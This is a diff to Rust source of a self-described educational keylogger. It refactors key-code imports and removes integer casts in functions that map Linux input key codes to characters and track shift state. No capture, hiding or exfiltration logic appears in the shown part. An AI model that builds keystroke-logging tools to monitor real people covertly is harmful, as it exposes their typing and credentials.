@@ -1,6 +1,5 @@
-use input_linux_sys::*;
-
 use educational_key_logger::input::InputEvent;
+use educational_key_logger::input_event_codes::*;
 
 #[derive(Default, Eq, PartialEq, Clone)]
 struct ModifierState {
@@ -12,7 +11,7 @@ struct ModifierState {
 }
 
 fn key_map(code: u16) -> Option<&'static str> {
-    match code as i32 {
+    match code {
         KEY_A => Some("a"),
         KEY_B => Some("b"),
         KEY_C => Some("c"),
@@ -132,7 +131,7 @@ fn key_map(code: u16) -> Option<&'static str> {
 }
 
 fn key_map_shift(code: u16) -> Option<&'static str> {
-    match code as i32 {
+    match code {
         KEY_A => Some("A"),
         KEY_B => Some("B"),
         KEY_C => Some("C"),
@@ -215,7 +214,7 @@ fn handle_key_press(
     result: &mut String,
     last_modifier_state: &mut (ModifierState, bool),
 ) {
-    match code as i32 {
+    match code {
         KEY_LEFTSHIFT | KEY_RIGHTSHIFT => {
             modifier_state.shift = true;
         }
@@ -292,7 +291,7 @@ fn handle_key_press(
     }
 }
 fn handle_key_release(code: u16, modifier_state: &mut ModifierState) {
-    match code as i32 {
+    match code {
         KEY_LEFTSHIFT | KEY_RIGHTSHIFT => {
             modifier_state.shift = false;
         }
